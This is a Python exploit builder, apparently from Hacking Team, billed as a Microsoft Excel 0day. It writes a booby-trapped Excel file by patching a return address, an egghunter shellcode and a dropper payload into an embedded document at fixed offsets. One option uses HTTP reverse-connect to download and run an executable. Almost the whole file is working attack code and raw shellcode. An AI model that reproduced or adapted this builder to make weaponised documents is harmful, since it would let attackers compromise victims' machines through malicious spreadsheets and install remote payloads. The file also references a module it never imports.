#! /usr/bin/env python

#Copyright HT srl, 2009-2010
#http://www.hackingteam.it/ for more information

#cod

# Microsoft Excel 0day


import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile

import jscript_unicode
import x86shelldrophttp
import x86int3
import ASCIIHexWhitespace
import x86helloworld


from resources import compressedfile

NAME='Excel 2007SP2/2003SP3/2002SP3' 
DESCRIPTION='[+] 0DAY - No details available'

DOCUMENTATION={}
DOCUMENTATION['Vendor']='Microsoft'
DOCUMENTATION['Date public']='N/A'
DOCUMENTATION['References']='http://www.microsoft.com/'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Excel 2007SP2/2003SP3/2002SP3'
DOCUMENTATION['CVE']='CVE-????-????'
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-????-????"

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP', 'VISTA', 'SEVEN']
PROPERTY['VENDOR']='Microsoft'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Tested on:
Windows XP Professional SP2/SP3/VISTA/SEVEN with Microsoft Excel XP/2003/2007
Windows Vista
Windows SEVEN
"""

CHANGELOG="""
"""

# Global payload
payload = 0

#from pyPdf.pdf import *
#from pyPdf.generic import *
#from pyPdf.filters import *

###
#START:
# OR DX, 0xFFFF
#INCREMENT:
# INC EDX
# PUSH EDX
# PUSH 2
# POP EAX
# INT 2E
# CMP AL, 5
# POP EDX
# JE START
# MOV EAX, 0x90419041
# MOV EDI, EDX
# SCASD
# JNE INCREMENT
# SCASD
# JNE INCREMENT
# JMP EDI
###

egghunter = (b"\x31\xd2"
b"\x66\x81\xca\xff\xff\x42\x83\xc2\x7c\x52\x6a\x02\x58\xcd\x2e\x3c"
b"\x05\x5a\x74\xec\xb8\x41\x90\x41\x90\x89\xd7\xaf\x75\xe8\xaf\x75"
b"\xe5\xff\xe7"
)

egghunter = (b"\x31\xd2"
b"\x66\x81\xca\xff\xff\x42\x83\xc2\x7c\x52\x6a\x02\x58\xcd\x2e\x3c"
b"\x05\x5a\x74\xec\xeb\x09\x90\x90\x90\x90\x90\x90\x90\x90\x90\xb8"
b"\x41\x90\x41\x90\x89\xd7\xaf\x75\xdd\xaf\x75\xda\xff\xe7"
)


class excel_002():
	def __init__(self, inputFile, outputFile, dbg):
		#self.setInfo(DESCRIPTION)
		self.name=NAME
		self.debugmode = dbg

		#self.source_pdf = 'resources/blank.pdf'
		self.dest_doc = outputFile
		self.infile = inputFile
		
		return

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename

	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.infile)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.infile)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	def make_doc(self):
		input = bytearray(zlib.decompress(compressedfile))
		
		#secondstage = 
		shellcode = self.createShellcode()

		retadd = b"\xDA\x89\x5b\x27\xFF\xFF\x81\xEC\x5B\x27\x00\x00\xeb\x22"   #return address + sub esp, 275Bh; jmp egghunter

		for i in range(0,14):
			input[0x2B20 + i] = retadd[i]
			input[0x2BAC + i] = retadd[i]
			input[0x2C38 + i] = retadd[i]
			input[0x2CC4 + i] = retadd[i]
			input[0x2D50 + i] = retadd[i]
			input[0x2DF4 + i] = retadd[i]
			input[0x2E80 + i] = retadd[i]
			input[0x2F0C + i] = retadd[i]
			input[0x2F98 + i] = retadd[i]
			input[0x303C + i] = retadd[i]
			input[0x30C8 + i] = retadd[i]
			input[0x3154 + i] = retadd[i]
			input[0x31E0 + i] = retadd[i]
			input[0x3284 + i] = retadd[i]
			input[0x3310 + i] = retadd[i]
			input[0x339C + i] = retadd[i]
			input[0x3428 + i] = retadd[i]
			input[0x34CC + i] = retadd[i]
			input[0x3558 + i] = retadd[i]
			input[0x35E4 + i] = retadd[i]
			input[0x3670 + i] = retadd[i]
			
		for i in range(0,len(egghunter)):
			input[0x2B20 + 0x30 + i] = egghunter[i]
			input[0x2BAC + 0x30 + i] = egghunter[i]
			input[0x2C38 + 0x30 + i] = egghunter[i]
			input[0x2CC4 + 0x30 + i] = egghunter[i]
			input[0x2D50 + 0x30 + i] = egghunter[i]
			input[0x2DF4 + 0x30 + i] = egghunter[i]
			input[0x2E80 + 0x30 + i] = egghunter[i]
			input[0x2F0C + 0x30 + i] = egghunter[i]
			input[0x2F98 + 0x30 + i] = egghunter[i]
			input[0x303C + 0x30 + i] = egghunter[i]
			input[0x30C8 + 0x30 + i] = egghunter[i]
			input[0x3154 + 0x30 + i] = egghunter[i]
			input[0x31E0 + 0x30 + i] = egghunter[i]
			input[0x3284 + 0x30 + i] = egghunter[i]
			input[0x3310 + 0x30 + i] = egghunter[i]
			input[0x339C + 0x30 + i] = egghunter[i]
			input[0x3428 + 0x30 + i] = egghunter[i]
			input[0x34CC + 0x30 + i] = egghunter[i]
			input[0x3558 + 0x30 + i] = egghunter[i]
			input[0x35E4 + 0x30 + i] = egghunter[i]
			input[0x3670 + 0x30 + i] = egghunter[i]

		offset = 0x4040
		for i in range(0,256):
			input[offset + i] = b"\x41\x90"[i%2]                                       #egg hunted

		for i in range(0,len(shellcode)):
			input[offset + 0x100 + i] = shellcode[i]

		print "Creating %s file "%(self.dest_doc)
		f = open(self.dest_doc,mode='wb')
		f.write(input)
		f.close()
		
		return 0


	def run(self):
		return self.make_doc()

if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 3:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] [DROPFILE] destination [-debug | -http]"
		sys.exit(0)

	if len(sys.argv) > 2:
		for i in range(2, len(sys.argv)):
			if sys.argv[i] == '-http':
				print "[HTTP] Using HTTP reverse connect to download exe"
				payload = 1
				http = True
			elif sys.argv[i] == '-debug':
				print "[DEBUG] Using INT3 exploit mode"
				dbg = True
			elif sys.argv[i] == '-hello':
				print "[HELLOWORLD] Using HelloWorld payload"
				payload = 2

	if http == False:
		if os.path.isfile(sys.argv[1]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[1])
			sys.exit(0)

		if os.path.getsize(sys.argv[1]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[1])
			sys.exit(0)

	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)
	
	app=excel_002(sys.argv[1], sys.argv[2], dbg)
	app.run()
	
	print ' ... done'